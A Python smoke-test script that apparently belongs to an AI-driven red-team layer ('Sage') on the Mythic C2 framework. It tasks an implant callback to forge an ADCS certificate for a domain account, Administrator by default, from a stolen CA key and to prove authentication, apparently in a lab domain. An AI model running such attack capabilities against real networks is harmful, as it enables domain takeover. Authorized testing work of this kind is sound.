#!/usr/bin/env python3
"""Bounded live proof for ADCS certificate authentication.

This smoke uses the real `execute_capability` path. Sage may resolve and stage a
verified CA PFX from its ledger, but the target-account certificate forge and all
authentication proof must execute through Mythic tasks on the selected callback.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import re
import sys
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[3]
os.environ.setdefault("SAGE_ENGAGEMENT_GATE", "1")
os.environ.setdefault("SAGE_ENGAGEMENT_STATE_DIR", str(ROOT / "Payload_Type" / "sage" / ".sage_engagement"))

sys.path.insert(0, str(ROOT / "skills" / "sage-live-runner" / "scripts"))
from mythic import mythic  # noqa: E402
from sage_task import resolve_password  # noqa: E402

sys.path.insert(0, str(ROOT / "Payload_Type" / "sage" / "ai" / "langgraph"))
import mythic_tools  # noqa: E402

SERVER = "127.0.0.1"
USER = "mythic_admin"
LONG_B64_RE = re.compile(r"(?<![A-Za-z0-9+/=])([A-Za-z0-9+/=]{160,})(?![A-Za-z0-9+/=])")


def _redact(value: Any) -> Any:
    if isinstance(value, dict):
        out = {}
        for key, item in value.items():
            if str(key).casefold() in {
                "password",
                "credential",
                "credential_text",
                "ca_pfx_password",
                "forged_pfx_password",
                "certificate_password",
                "new_cert_password",
            } and not isinstance(item, dict):
                out[key] = "<redacted>"
            else:
                out[key] = _redact(item)
        return out
    if isinstance(value, list):
        return [_redact(item) for item in value]
    if isinstance(value, str):
        return LONG_B64_RE.sub("<redacted-base64>", value)
    return value


def _callback_payload_type(callback: dict[str, Any]) -> str:
    payload = callback.get("payload") if isinstance(callback.get("payload"), dict) else {}
    payload_type = payload.get("payloadtype") if isinstance(payload.get("payloadtype"), dict) else {}
    return str(payload_type.get("name") or callback.get("payloadtype") or "")


async def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--callback", type=int, default=int(os.environ.get("APOLLO_CB", "14")))
    parser.add_argument("--domain", default=os.environ.get("ADCS_AUTH_DOMAIN", "essos.local"))
    parser.add_argument("--account", default=os.environ.get("ADCS_AUTH_ACCOUNT", "Administrator"))
    parser.add_argument("--ca-host", default=os.environ.get("ADCS_CA_HOST", "braavos"))
    parser.add_argument("--account-sid", default=os.environ.get("ADCS_AUTH_ACCOUNT_SID", ""))
    parser.add_argument("--sid-extension-encoding", default=os.environ.get("ADCS_AUTH_SID_EXTENSION_ENCODING", "utf8"))
    parser.add_argument("--ca-pfx-password", default=os.environ.get("ADCS_CA_PFX_PASSWORD", ""))
    parser.add_argument("--forged-pfx-password", default=os.environ.get("ADCS_FORGED_PFX_PASSWORD", ""))
    parser.add_argument("--remote-ca-pfx-path", default=os.environ.get("ADCS_REMOTE_CA_PFX_PATH", ""))
    parser.add_argument("--remote-forged-pfx-path", default=os.environ.get("ADCS_REMOTE_FORGED_PFX_PATH", ""))
    parser.add_argument("--proof-host", default=os.environ.get("ADCS_PROOF_HOST", "meereen.essos.local"))
    parser.add_argument("--certificate-auth-method", default=os.environ.get("ADCS_AUTH_METHOD", ""))
    parser.add_argument("--ca-artifact", default="", help="retired; CA artifacts must come from the verified ledger")
    parser.add_argument("--timeout", type=int, default=180)
    args = parser.parse_args()

    if args.ca_artifact:
        print("ERROR: --ca-artifact is retired. Record the CA artifact through Mythic-tasked export and the ledger first.")
        return 2

    mythic_tools.ENGAGEMENT_GATE_ENABLED = True
    client = await mythic.login(server_ip=SERVER, username=USER, password=resolve_password())
    callbacks = await mythic.get_all_active_callbacks(client)
    callback = next((item for item in callbacks if int(item.get("display_id") or 0) == args.callback), {})
    if not callback:
        print(f"ERROR: callback {args.callback} not found")
        return 1
    payload_type = _callback_payload_type(callback).casefold()
    print(
        f"target callback: cb{args.callback} payload={payload_type} "
        f"host={callback.get('host')} user={callback.get('user')}"
    )

    tools = mythic_tools.MythicTools(agent_task_id="focused-adcs-certificate-auth")
    tools.client = client
    await tools._ensure_engagement_key()
    print(f"engagement: {tools._eng_key()}")

    domain = args.domain.strip().casefold()
    account = args.account.strip().casefold()
    ca_host = args.ca_host.strip().casefold()
    action = {
        "capability": "adcs-certificate-auth",
        "domain": domain,
        "account": account,
        "ca_host": ca_host,
        "callback_id": str(args.callback),
    }
    inputs: dict[str, Any] = {
        "proof_host": args.proof_host,
        "timeout": args.timeout,
    }
    for key, value in (
        ("account_sid", args.account_sid),
        ("sid_extension_encoding", args.sid_extension_encoding),
        ("ca_pfx_password", args.ca_pfx_password),
        ("forged_pfx_password", args.forged_pfx_password),
        ("remote_ca_pfx_path", args.remote_ca_pfx_path),
        ("forged_pfx_path", args.remote_forged_pfx_path),
        ("certificate_auth_method", args.certificate_auth_method),
    ):
        if str(value or "").strip():
            inputs[key] = value

    raw = await tools.execute_capability(action, inputs)
    try:
        payload = json.loads(raw)
    except Exception:
        payload = {"ok": False, "verdict": "failed", "reason": str(raw)}
    print(json.dumps(_redact(payload), indent=2, sort_keys=True))
    return 0 if payload.get("ok") is True else 2


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
